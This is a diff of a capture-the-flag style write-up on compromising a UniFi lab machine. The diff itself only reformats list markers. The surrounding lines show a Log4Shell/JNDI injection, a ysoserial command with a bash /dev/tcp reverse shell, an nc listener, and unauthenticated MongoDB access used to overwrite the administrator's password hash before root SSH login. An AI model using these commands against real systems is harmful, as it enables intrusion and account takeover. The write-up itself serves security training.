@@ -26,13 +26,13 @@ tags:
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
 
 ```bash
 ping -c1 10.129.87.49
 ```
 
-2. Nmap
+- Nmap
 
 ```bash
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.87.49
@@ -40,7 +40,7 @@ nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.87.49
 
 ![](/img2/Pasted%20image%2020250317194604.png)
 
-3. Version scan with nmap
+- Version scan with nmap
 
 ```bash
 nmap -sV -p22,6789,8080,8443,8843,8880 10.129.87.49
@@ -48,11 +48,11 @@ nmap -sV -p22,6789,8080,8443,8843,8880 10.129.87.49
 
 ![](/img2/Pasted%20image%2020250317195906.png)
 
-4. Check the version of UniFi 
+- Check the version of UniFi 
 
 ![](/img2/Pasted%20image%2020250318164539.png)
 
-5. Try to inject jndi malicious command
+- Try to inject jndi malicious command
 
 ![](/img2/Pasted%20image%2020250318164643.png)
 
@@ -68,7 +68,7 @@ java -jar ysoserial-modified.jar CommonsCollections3 bash 'bash -i >& /dev/tcp/1
 
 ## Exploitation
 
-1. Exploit Log4shell vulnerability
+- Exploit Log4shell vulnerability
 
 ```bash
 git clone https://github.com/kozmer/log4j-shell-poc
@@ -85,14 +85,14 @@ nc -nlvp 9000
 
 ## Post-exploitation
 
-1. See actual process
+- See actual process
 
 ```bash
 ps aux
 ```
 ![](/img2/Pasted%20image%2020250318230925.png)
 
-2. Connect to MongoDB without credentials
+- Connect to MongoDB without credentials
 
 ```bash
 mongo --port 27117
@@ -117,13 +117,13 @@ db.admin.find().forEach(printjson)
 
 ![](/img2/Pasted%20image%2020250318231439.png)
 
-3. Create SHA-512 password
+- Create SHA-512 password
 
 ```bash
 mkpasswd -m sha-512 pass
 ```
 
-4. Change administrator password 
+- Change administrator password 
 
 ```MongoDB
 db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$6bm13IhH/uh7JzE.$BDesurCeAnw.uSQMDgVa6fGVK/G9w1WrOIkPPInm3eY86pkXJmts.aEpU6S5k34/ubTXZAq.pe4rXgTNPNlJc1"}})
@@ -131,7 +131,7 @@ db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"
 
 ![](/img2/Pasted%20image%2020250318230845.png)
 
-5. Check root password and connect with SSH
+- Check root password and connect with SSH
 
 ![](/img2/Pasted%20image%2020250318231944.png)
 
